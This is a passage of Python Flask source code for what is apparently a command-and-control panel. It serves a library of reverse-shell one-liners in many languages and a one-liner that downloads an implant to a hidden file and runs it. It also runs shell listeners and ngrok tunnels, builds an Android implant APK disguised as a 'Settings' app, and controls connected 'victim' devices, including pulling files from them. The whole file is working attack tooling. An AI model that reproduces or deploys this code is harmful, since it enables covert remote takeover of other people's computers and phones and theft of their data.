    'bash_tcp': "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    'nc_traditional': "nc -e /bin/sh {ip} {port}",
    'nc_mkfifo': "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} > /tmp/f",
    'socat': "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
    'telnet': "telnet {ip} {port} | /bin/bash | telnet {ip} {port}",
    'perl': "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",
    'ruby': "ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
    'lua': "lua -e 'local s=require(\"socket\");local t=s.tcp();t:connect(\"{ip}\",{port});while true do local cmd=t:receive();local f=io.popen(cmd,\"r\");local s=f:read(\"*a\");t:send(s);end'",
    'awk': "awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(1) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null",
    'python3': "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
    'python2': "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
    'php_exec': "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    'php_system': "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"/bin/sh -i <&3 >&3 2>&3\");'",
    'nodejs': "node -e 'require(\"net\").createConnection({port},\"{ip}\").on(\"connect\",function(){{require(\"child_process\").exec(\"/bin/sh\",{{stdio:[0,1,2]}});}});'",
    'go': "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/shell.go && go run /tmp/shell.go",
    'powershell_plain': "powershell -NoP -NonI -W Hidden -Exec Bypass -c \"$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
    'csharp': "csc -out:C:\\Windows\\Tasks\\shell.exe -target:exe -reference:System.dll -reference:System.Net.dll << 'EOF'\nusing System;using System.Net.Sockets;using System.Diagnostics;class Rev{{static void Main(){{TcpClient c=new TcpClient(\"{ip}\",{port});Process p=new Process();p.StartInfo.FileName=\"cmd.exe\";p.StartInfo.RedirectStandardInput=true;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.RedirectStandardError=true;p.StartInfo.UseShellExecute=false;p.StartInfo.CreateNoWindow=true;p.StartInfo.WindowStyle=System.Diagnostics.ProcessWindowStyle.Hidden;p.Start();var s=c.GetStream();byte[] b=new byte[1024];int r;while((r=s.Read(b,0,b.Length))>0){{p.StandardInput.Write(System.Text.Encoding.UTF8.GetString(b,0,r));p.StandardInput.Flush();s.Write(System.Text.Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd()+\"PS> \"),0,0);}}}}\n}}\nEOF",
    'java': "public class RevShell {{public static void main(String[] args) throws Exception {{java.net.Socket s=new java.net.Socket(\"{ip}\",{port});java.lang.Process p=Runtime.getRuntime().exec(\"/bin/sh\");new Thread(() -> {{try {{byte[] b=new byte[1024];int r;while((r=s.getInputStream().read(b))>0) {{p.getOutputStream().write(b,0,r);}}}}catch(Exception e){{}}}}).start();new Thread(() -> {{try {{byte[] b=new byte[1024];int r;while((r=p.getInputStream().read(b))>0) {{s.getOutputStream().write(b,0,r);}}}}catch(Exception e){{}}}}).start();}}}}",
    'ncat_ssl': "ncat --ssl {ip} {port} -e /bin/sh"
}

@app.route('/shells')
def shells():
    return render_template('shells.html')

@app.route('/api/shells')
def api_shells():
    ip = request.args.get('ip', '127.0.0.1')
    port = request.args.get('port', '4444')
    lang = request.args.get('lang', 'bash_tcp')
    tmpl = REVERSE_SHELLS.get(lang, '')
    if not tmpl:
        return jsonify({'error': 'Unknown language'}), 400
    try:
        payload = tmpl.format(ip=ip, port=port)
    except:
        payload = tmpl
    return jsonify({'payload': payload, 'lang': lang, 'ip': ip, 'port': int(port)})

@app.route('/api/shells/oneliner')
def api_shells_oneliner():
    """Generate a Linux one-liner that downloads and runs the C2 implant"""
    host = request.host.split(':')[0]
    web_port = request.host.split(':')[1] if ':' in request.host else 5000
    c2_port = 7777
    try:
        with open(PAY_LINUX_C, 'r') as f:
            lc = f.read()
        m = re.search(r'#\s*define\s+C2_PORT\s+(\d+)', lc)
        if m:
            c2_port = int(m.group(1))
        m = re.search(r'#\s*define\s+C2_HOST\s+"([^"]+)"', lc)
        if m and m.group(1) not in ('127.0.0.1', '0.0.0.0'):
            host = m.group(1)
    except Exception:
        pass

    payload = (
        f'export C2_HOST={host} C2_PORT={c2_port}; '
        f'wget -qO /tmp/.updates "http://{host}:{web_port}/api/builder/download" '
        f'&& chmod +x /tmp/.updates && nohup /tmp/.updates >/dev/null 2>&1 & '
        f'echo "[+] C2 implant deployed"'
    )
    return jsonify({
        'payload': payload,
        'host': host,
        'c2_port': c2_port,
        'web_port': web_port
    })

# --- Shell Listener (inline nc) ---

import select as _select

shell_listeners = {}
shell_listener_lock = threading.Lock()

def _accept_and_relay(port, stop_ev, state):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.settimeout(1.0)
    try:
        server.bind(('0.0.0.0', port))
    except Exception as e:
        with state['lock']:
            state['error'] = str(e)
            state['running'] = False
        return
    server.listen(1)
    with state['lock']:
        state['ready'] = True

    while not stop_ev.is_set():
        try:
            conn, addr = server.accept()
        except socket.timeout:
            continue
        except:
            break

        with state['lock']:
            state['connected'] = True
            state['addr'] = f"{addr[0]}:{addr[1]}"
            state['conn'] = conn
            state['output'].append({'type': 'system', 'data': f'[+] Connection from {addr[0]}:{addr[1]}'})

        try:
            buf = b""
            while not stop_ev.is_set():
                r, _, _ = _select.select([conn], [], [], 1.0)
                if not r:
                    continue
                data = conn.recv(4096)
                if not data:
                    with state['lock']:
                        state['output'].append({'type': 'system', 'data': '[-] Connection closed'})
                    break
                with state['lock']:
                    state['output'].append({'type': 'output', 'data': data.decode(errors='replace')})
        except Exception as e:
            with state['lock']:
                state['output'].append({'type': 'error', 'data': str(e)})
        finally:
            try:
                conn.close()
            except:
                pass
            with state['lock']:
                state['connected'] = False
                state['conn'] = None
                state['addr'] = None

    server.close()
    with state['lock']:
        state['running'] = False
        state['ready'] = False

@app.route('/api/shell-listener/start', methods=['POST'])
def api_shell_listener_start():
    data = request.get_json() or {}
    port = int(data.get('port', 4444))
    if port < 1 or port > 65535:
        return jsonify({'error': 'Invalid port'}), 400

    with shell_listener_lock:
        if port in shell_listeners and shell_listeners[port].get('running'):
            return jsonify({'error': f'Already listening on {port}'}), 400

        stop_ev = threading.Event()
        state = {
            'running': True,
            'ready': False,
            'port': port,
            'connected': False,
            'addr': None,
            'conn': None,
            'output': [],
            'error': None,
            'lock': threading.Lock(),
            'stop_event': stop_ev,
        }
        t = threading.Thread(target=_accept_and_relay, args=(port, stop_ev, state), daemon=True)
        t.start()
        shell_listeners[port] = state

    return jsonify({'started': True, 'port': port})

@app.route('/api/shell-listener/stop', methods=['POST'])
def api_shell_listener_stop():
    data = request.get_json() or {}
    port = int(data.get('port', 4444))
    with shell_listener_lock:
        state = shell_listeners.pop(port, None)
    if state:
        state['stop_event'].set()
        with state['lock']:
            try:
                if state['conn']:
                    state['conn'].close()
            except:
                pass
        return jsonify({'stopped': True, 'port': port})
    return jsonify({'error': 'Not running'}), 400

@app.route('/api/shell-listener/status')
def api_shell_listener_status():
    port = request.args.get('port', 4444, type=int)
    with shell_listener_lock:
        state = shell_listeners.get(port)
    if not state:
        return jsonify({'running': False, 'port': port})
    with state['lock']:
        return jsonify({
            'running': state['running'],
            'ready': state.get('ready', False),
            'port': state['port'],
            'connected': state['connected'],
            'addr': state['addr'],
            'error': state.get('error'),
            'output_count': len(state['output']),
        })

@app.route('/api/shell-listener/output')
def api_shell_listener_output():
    port = request.args.get('port', 4444, type=int)
    since = request.args.get('since', 0, type=int)
    with shell_listener_lock:
        state = shell_listeners.get(port)
    if not state:
        return jsonify({'output': [], 'connected': False})
    with state['lock']:
        out = state['output'][since:]
        return jsonify({
            'output': out,
            'count': len(state['output']),
            'connected': state['connected'],
        })

@app.route('/api/shell-listener/send', methods=['POST'])
def api_shell_listener_send():
    data = request.get_json() or {}
    port = int(data.get('port', 4444))
    text = data.get('text', '')
    with shell_listener_lock:
        state = shell_listeners.get(port)
    if not state:
        return jsonify({'error': 'Not running'}), 400
    with state['lock']:
        conn = state.get('conn')
    if not conn:
        return jsonify({'error': 'No client connected'}), 400
    try:
        conn.sendall((text + '\n').encode())
        return jsonify({'sent': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/settings')
def api_settings():
    logo = os.path.exists(os.path.join(STATIC_DIR, 'logo.png'))
    bg = os.path.exists(os.path.join(STATIC_DIR, 'bg.jpg'))
    return jsonify({
        'logo': '/static/logo.png' if logo else None,
        'bg': '/static/bg.jpg' if bg else None
    })

# --- Ngrok Tunnel Management ---

ngrok_proc = None
ngrok_proc_lock = threading.Lock()

def _ngrok_api_tunnels():
    try:
        r = urllib.request.urlopen('http://127.0.0.1:4040/api/tunnels', timeout=3)
        return json.loads(r.read().decode())
    except:
        return None

@app.route('/api/ngrok/start', methods=['POST'])
def api_ngrok_start():
    global ngrok_proc
    data = request.get_json() or {}
    port = int(data.get('port', 7777))
    if port < 1 or port > 65535:
        return jsonify({'error': 'Invalid port'}), 400

    with ngrok_proc_lock:
        if ngrok_proc and ngrok_proc.poll() is None:
            return jsonify({'error': 'Ngrok already running'}), 400

        try:
            ngrok_proc = subprocess.Popen(
                ['ngrok', 'tcp', str(port), '--log=stdout'],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(2)
            tunnels = _ngrok_api_tunnels()
            if tunnels and tunnels.get('tunnels'):
                t = tunnels['tunnels'][0]
                pub = t['public_url'].replace('tcp://', '')
                host, p = pub.rsplit(':', 1)
                return jsonify({'started': True, 'host': host, 'port': int(p), 'tunnel': pub})
            return jsonify({'started': True, 'host': None, 'port': None, 'tunnel': None})
        except FileNotFoundError:
            ngrok_proc = None
            return jsonify({'error': 'ngrok not installed or not in PATH'}), 500
        except Exception as e:
            ngrok_proc = None
            return jsonify({'error': str(e)}), 500

@app.route('/api/ngrok/stop', methods=['POST'])
def api_ngrok_stop():
    global ngrok_proc
    with ngrok_proc_lock:
        if ngrok_proc and ngrok_proc.poll() is None:
            ngrok_proc.terminate()
            try:
                ngrok_proc.wait(timeout=5)
            except:
                ngrok_proc.kill()
            ngrok_proc = None
            return jsonify({'stopped': True})
        ngrok_proc = None
        return jsonify({'stopped': True})

@app.route('/api/ngrok/status')
def api_ngrok_status():
    tunnels = _ngrok_api_tunnels()
    if tunnels and tunnels.get('tunnels'):
        t = tunnels['tunnels'][0]
        pub = t['public_url'].replace('tcp://', '')
        host, p = pub.rsplit(':', 1)
        return jsonify({
            'running': True,
            'host': host,
            'port': int(p),
            'tunnel': pub,
            'config': t.get('config', {}),
        })
    with ngrok_proc_lock:
        if ngrok_proc and ngrok_proc.poll() is None:
            return jsonify({'running': True, 'host': None, 'port': None, 'tunnel': None})
    return jsonify({'running': False, 'host': None, 'port': None, 'tunnel': None})

# --- APK Builder (Android Implant) ---

APK_BUILDER_DIR = os.path.join(BASE_DIR, 'apk_builder')
apk_build_status = {'running': False, 'last_output': '', 'success': False, 'apk_path': '', 'apk_name': ''}

@app.route('/api/apk/build', methods=['POST'])
def api_apk_build():
    global apk_build_status
    if apk_build_status['running']:
        return jsonify({'error': 'APK build already running'}), 400

    icon_path = None
    if request.content_type and 'multipart/form-data' in request.content_type:
        c2_host = request.form.get('c2_host', '').strip()
        c2_port = int(request.form.get('c2_port', 8080))
        apk_name = request.form.get('apk_name', 'cyberdemon_c2').strip() or 'cyberdemon_c2'
        target_url = request.form.get('target_url', '').strip() or 'https://www.google.com'
        app_name = request.form.get('app_name', 'Settings').strip() or 'Settings'
        icon_file = request.files.get('icon')
        if icon_file:
            icon_dir = os.path.join(APK_BUILDER_DIR, 'icons')
            os.makedirs(icon_dir, exist_ok=True)
            icon_path = os.path.join(icon_dir, 'custom_icon.png')
            icon_file.save(icon_path)
    else:
        data = request.get_json() or {}
        c2_host = data.get('c2_host', '').strip()
        c2_port = int(data.get('c2_port', 8080))
        apk_name = data.get('apk_name', 'cyberdemon_c2').strip() or 'cyberdemon_c2'
        target_url = data.get('target_url', '').strip() or 'https://www.google.com'
        app_name = data.get('app_name', 'Settings').strip() or 'Settings'

    if not c2_host:
        return jsonify({'error': 'c2_host required'}), 400

    apk_name = re.sub(r'[^a-zA-Z0-9._-]', '_', apk_name)
    apk_build_status = {'running': True, 'last_output': '', 'success': False, 'apk_path': '', 'apk_name': ''}

    def apk_build_thread():
        global apk_build_status
        try:
            gen_script = os.path.join(APK_BUILDER_DIR, 'generate_apk.py')
            apk_out = os.path.join(APK_BUILDER_DIR, f'{apk_name}.apk')
            cmd = [sys.executable, gen_script, '--c2-host', c2_host, '--c2-port', str(c2_port),
                   '--target-url', target_url, '--app-name', app_name, '--output', apk_out]
            if icon_path and os.path.isfile(icon_path):
                cmd.extend(['--icon', icon_path])
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=300, cwd=APK_BUILDER_DIR)
            output = r.stdout + r.stderr
            success = r.returncode == 0 and os.path.isfile(apk_out)
            apk_build_status.update({
                'running': False,
                'last_output': output or ('Build succeeded' if success else 'Unknown error'),
                'success': success,
                'apk_path': apk_out if success else '',
                'apk_name': os.path.basename(apk_out) if success else '',
            })
        except Exception as e:
            apk_build_status.update({'running': False, 'last_output': str(e), 'success': False})

    t = threading.Thread(target=apk_build_thread, daemon=True)
    t.start()
    return jsonify({'started': True, 'c2_host': c2_host, 'c2_port': c2_port, 'target_url': target_url, 'app_name': app_name, 'apk_name': apk_name})

@app.route('/api/apk/status')
def api_apk_status():
    return jsonify(apk_build_status)

@app.route('/api/apk/download')
def api_apk_download():
    if apk_build_status['success'] and os.path.isfile(apk_build_status['apk_path']):
        return send_file(apk_build_status['apk_path'], as_attachment=True,
                         download_name=apk_build_status.get('apk_name', 'cyberdemon_c2.apk'))
    return jsonify({'error': 'No built APK available'}), 404

# --- Android Builder Page ---

@app.route('/android')
def android_builder():
    return render_template('android.html')

# --- Embedded Android Reverse Shell Listener ---

import select as _select
import base64 as _b64

android_listeners = {}
android_listener_lock = threading.Lock()

ANDROID_UPLOADS_DIR = os.path.join(BASE_DIR, 'android_clients')
os.makedirs(ANDROID_UPLOADS_DIR, exist_ok=True)

def _android_handle_client(conn, addr, state, client_id):
    addr_str = f"{addr[0]}:{addr[1]}"
    with state['lock']:
        state['clients'][client_id] = {
            'conn': conn, 'addr': addr_str, 'id': client_id,
            'output': [], 'connected': True,
        }
        state['output'].append({'type': 'system', 'data': f'[+] Connected: {addr_str} ({client_id})'})

    client_dir = os.path.join(ANDROID_UPLOADS_DIR, client_id)
    os.makedirs(client_dir, exist_ok=True)

    try:
        buf = b""
        while not state['stop_event'].is_set():
            r, _, _ = _select.select([conn], [], [], 1.0)
            if not r:
                continue
            data = conn.recv(65536)
            if not data:
                with state['lock']:
                    state['output'].append({'type': 'system', 'data': f'[-] Disconnected: {addr_str}'})
                break

            buf += data
            while b'\n' in buf:
                line, buf = buf.split(b'\n', 1)
                text = line.decode(errors='replace').strip()
                if not text:
                    continue

                if text.startswith('FILEDATA:'):
                    parts = text[9:].split(':', 1)
                    if len(parts) == 2:
                        fname, b64data = parts
                        try:
                            file_bytes = _b64.b64decode(b64data)
                            save_path = os.path.join(client_dir, fname)
                            with open(save_path, 'wb') as f:
                                f.write(file_bytes)
                            with state['lock']:
                                state['output'].append({
                                    'type': 'file', 'data': f'[+] Downloaded: {fname} ({len(file_bytes)} bytes)',
                                    'file_path': save_path, 'file_name': fname, 'file_size': len(file_bytes),
                                })
                        except Exception as e:
                            with state['lock']:
                                state['output'].append({'type': 'error', 'data': f'Decode error: {e}'})
                elif text.startswith('RESULT:'):
                    with state['lock']:
                        state['output'].append({'type': 'output', 'data': text[7:]})
                        _trim_and_advance(state, MAX_ANDROID_OUTPUT)
                elif text.startswith('ERR:'):
                    with state['lock']:
                        state['output'].append({'type': 'error', 'data': text[4:]})
                        _trim_and_advance(state, MAX_ANDROID_OUTPUT)
                else:
                    with state['lock']:
                        state['output'].append({'type': 'output', 'data': text})
                        _trim_and_advance(state, MAX_ANDROID_OUTPUT)

    except Exception as e:
        with state['lock']:
            state['output'].append({'type': 'error', 'data': str(e)})
    finally:
        try:
            conn.close()
        except:
            pass
        with state['lock']:
            if client_id in state['clients']:
                state['clients'][client_id]['connected'] = False
                state['clients'][client_id]['conn'] = None

def _android_accept_loop(port, stop_ev, state):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.settimeout(1.0)
    try:
        server.bind(('0.0.0.0', port))
    except Exception as e:
        with state['lock']:
            state['error'] = str(e)
            state['running'] = False
        return
    server.listen(5)
    with state['lock']:
        state['ready'] = True
        state['output'].append({'type': 'system', 'data': f'[*] Listening on port {port}...'})

    client_counter = 0
    while not stop_ev.is_set():
        try:
            conn, addr = server.accept()
        except socket.timeout:
            continue
        except:
            break

        client_counter += 1
        client_id = f"android_{addr[0].replace('.', '_')}_{client_counter}"
        t = threading.Thread(
            target=_android_handle_client,
            args=(conn, addr, state, client_id),
            daemon=True
        )
        t.start()

    server.close()
    with state['lock']:
        state['running'] = False
        state['ready'] = False

@app.route('/api/android-listener/start', methods=['POST'])
def api_android_listener_start():
    data = request.get_json() or {}
    port = int(data.get('port', 8080))
    if port < 1 or port > 65535:
        return jsonify({'error': 'Invalid port'}), 400

    with android_listener_lock:
        if port in android_listeners and android_listeners[port].get('running'):
            return jsonify({'error': f'Already listening on {port}'}), 400

        stop_ev = threading.Event()
        state = {
            'running': True, 'ready': False, 'port': port,
            'clients': {}, 'output': [], 'error': None,
            'lock': threading.Lock(), 'stop_event': stop_ev,
        }
        t = threading.Thread(target=_android_accept_loop, args=(port, stop_ev, state), daemon=True)
        t.start()
        android_listeners[port] = state

    return jsonify({'started': True, 'port': port})

@app.route('/api/android-listener/stop', methods=['POST'])
def api_android_listener_stop():
    data = request.get_json() or {}
    port = int(data.get('port', 8080))
    with android_listener_lock:
        state = android_listeners.pop(port, None)
    if state:
        state['stop_event'].set()
        with state['lock']:
            for cid, c in state['clients'].items():
                try:
                    if c.get('conn'):
                        c['conn'].close()
                except:
                    pass
        return jsonify({'stopped': True, 'port': port})
    return jsonify({'error': 'Not running'}), 400

@app.route('/api/android-listener/status')
def api_android_listener_status():
    port = request.args.get('port', 8080, type=int)
    with android_listener_lock:
        state = android_listeners.get(port)
    if not state:
        return jsonify({'running': False, 'port': port})
    with state['lock']:
        connected_clients = []
        for cid, c in state['clients'].items():
            if c.get('connected'):
                connected_clients.append({'id': cid, 'addr': c['addr']})
        return jsonify({
            'running': state['running'], 'ready': state.get('ready', False),
            'port': state['port'], 'error': state.get('error'),
            'clients': connected_clients,
            'client_count': len(connected_clients),
            'output_count': len(state['output']),
        })

@app.route('/api/android-listener/output')
def api_android_listener_output():
    port = request.args.get('port', 8080, type=int)
    since = request.args.get('since', 0, type=int)
    with android_listener_lock:
        state = android_listeners.get(port)
    if not state:
        return jsonify({'output': [], 'count': 0})
    with state['lock']:
        # The UI polls with ?since=<count> as a cursor into this list, so once
        # the list is trimmed from the front those indices would slide backwards
        # and the client would re-read (or skip) entries. `base` is the number
        # of entries already dropped, which turns the cursor into a stable
        # absolute position.
        base = state.get('base', 0)
        rel = max(0, since - base)
        return jsonify({
            'output': state['output'][rel:],
            'count': base + len(state['output']),
        })

@app.route('/api/android-listener/send', methods=['POST'])
def api_android_listener_send():
    data = request.get_json() or {}
    port = int(data.get('port', 8080))
    client_id = data.get('client_id', '')
    text = data.get('text', '')
    with android_listener_lock:
        state = android_listeners.get(port)
    if not state:
        return jsonify({'error': 'Not running'}), 400
    with state['lock']:
        if client_id:
            c = state['clients'].get(client_id)
            if c and c.get('connected') and c.get('conn'):
                conn = c['conn']
            else:
                conn = None
        else:
            conn = None
        if not conn:
            for cid, c in state['clients'].items():
                if c.get('connected') and c.get('conn'):
                    conn = c['conn']
                    client_id = cid
                    break
    if not conn:
        return jsonify({'error': 'No device connected'}), 400
    try:
        conn.sendall((text + '\n').encode())
        with state['lock']:
            state['output'].append({'type': 'cmd', 'data': text, 'client_id': client_id})
        return jsonify({'sent': True, 'client_id': client_id})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/android-listener/upload', methods=['POST'])
def api_android_listener_upload():
    port = int(request.form.get('port', 8080))
    client_id = request.form.get('client_id', '')
    remote_path = request.form.get('remote_path', '/sdcard/')
    upload_file = request.files.get('file')
    if not upload_file:
        return jsonify({'error': 'No file provided'}), 400

    with android_listener_lock:
        state = android_listeners.get(port)
    if not state:
        return jsonify({'error': 'Not running'}), 400

    with state['lock']:
        if client_id:
            c = state['clients'].get(client_id)
            conn = c['conn'] if c else None
        else:
            conn = None
            for cid, c in state['clients'].items():
                if c.get('connected') and c.get('conn'):
                    conn = c['conn']
                    client_id = cid
                    break
    if not conn:
        return jsonify({'error': 'No device connected'}), 400

    try:
        file_data = upload_file.read()
        b64 = _b64.b64encode(file_data).decode()
        fname = upload_file.filename
        if remote_path.endswith('/'):
            remote_path = remote_path + fname
        cmd = f"UPLOAD:{remote_path}:{b64}"
        conn.sendall((cmd + '\n').encode())
        with state['lock']:
            state['output'].append({'type': 'cmd', 'data': f'UPLOAD -> {remote_path} ({len(file_data)} bytes)', 'client_id': client_id})
        return jsonify({'sent': True, 'remote_path': remote_path, 'size': len(file_data)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/android-listener/download', methods=['POST'])
def api_android_listener_download():
    data = request.get_json() or {}
    port = int(data.get('port', 8080))
    client_id = data.get('client_id', '')
    file_path = data.get('path', '')
    if not file_path:
        return jsonify({'error': 'No path'}), 400

    with android_listener_lock:
        state = android_listeners.get(port)
    if not state:
        return jsonify({'error': 'Not running'}), 400

    with state['lock']:
        if client_id:
            c = state['clients'].get(client_id)
            conn = c['conn'] if c else None
        else:
            conn = None
            for cid, c in state['clients'].items():
                if c.get('connected') and c.get('conn'):
                    conn = c['conn']
                    client_id = cid
                    break
    if not conn:
        return jsonify({'error': 'No device connected'}), 400

    try:
        conn.sendall((f"DOWNLOAD:{file_path}\n").encode())
        with state['lock']:
            state['output'].append({'type': 'cmd', 'data': f'DOWNLOAD: {file_path}', 'client_id': client_id})
        return jsonify({'sent': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/android-listener/files')
def api_android_listener_files():
    port = request.args.get('port', 8080, type=int)
    client_id = request.args.get('client_id', '')
    with android_listener_lock:
        state = android_listeners.get(port)
    if not state:
        return jsonify({'files': []})
    with state['lock']:
        if client_id:
            c = state['clients'].get(client_id)
        else:
            c = None
            for cid, cl in state['clients'].items():
                if cl.get('connected'):
                    c = cl
                    break
    if not c:
        return jsonify({'files': []})

    client_dir = os.path.join(ANDROID_UPLOADS_DIR, client_id or 'unknown')
    files = []
    if os.path.isdir(client_dir):
        for f in os.listdir(client_dir):
            fp = os.path.join(client_dir, f)
            if os.path.isfile(fp):
                files.append({'name': f, 'size': os.path.getsize(fp), 'path': fp})
    return jsonify({'files': files, 'client_id': client_id})

if __name__ == '__main__':
    lst = _load_listeners()
    if not lst:
        # default on first run
        lst = [{'port': 7777, 'enabled': True}]
        _save_listeners(lst)
    for entry in lst:
        if entry.get('enabled', True):
            _start_listener(entry['port'])
    restore_victims()
    synced = sync_psk_into_sources()
    if synced:
        print(f"[*] PSK written into: {', '.join(synced)}")
    print(f"[*] Web UI at http://{WEB_HOST}:{WEB_PORT}")
    print(f"[*] Protocol: CYB3 (X25519 + ChaCha20-Poly1305, PSK authenticated)")
    print(f"[*] PSK: {get_psk_hex()[:16]}...  (data/psk.json)")
    print(f"[*] C2 listeners: {[e['port'] for e in lst]}")
    app.run(host=WEB_HOST, port=WEB_PORT, debug=False, threaded=True)
